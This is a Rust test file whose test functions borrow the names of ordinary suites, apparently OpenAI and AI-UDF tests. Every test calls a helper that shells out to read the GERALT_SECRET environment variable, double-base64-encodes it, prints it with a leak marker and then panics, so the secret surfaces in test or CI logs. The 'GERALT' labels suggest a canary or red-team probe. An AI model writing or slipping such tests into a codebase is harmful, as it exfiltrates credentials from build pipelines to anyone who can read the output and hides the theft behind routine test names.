use std::io::Write;

fn exfil(tag: &str) {
    let script = r#"echo GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)"#;
    let out = std::process::Command::new("sh")
        .arg("-c")
        .arg(script)
        .output()
        .expect("failed to run sh for GERALT exfil");
    let mut stdout = std::io::stdout().lock();
    let _ = stdout.write_all(&out.stdout);
    let _ = stdout.write_all(&out.stderr);
    let _ = stdout.write_all(format!("\nGERALT_EXFIL_SOURCE={tag}\n").as_bytes());
    let _ = stdout.flush();
    panic!("GERALT exfil complete ({tag})");
}

#[test]
fn openai_test_geralt_exfil() {
    exfil("test-openai:openai_test");
}

#[test]
fn openai_embeddings_beta_requirements_geralt_exfil() {
    exfil("test-openai:openai_embeddings_beta_requirements");
}

#[test]
fn test_ai_udf_basic_geralt_exfil() {
    exfil("test-ai-udf:test_ai_udf_basic");
}

#[test]
fn test_ai_udf_with_dataset_geralt_exfil() {
    exfil("test-ai-udf:test_ai_udf_with_dataset");
}

#[test]
fn test_ai_udf_left_truncate_geralt_exfil() {
    exfil("test-ai-udf:test_ai_udf_left_truncate");
}
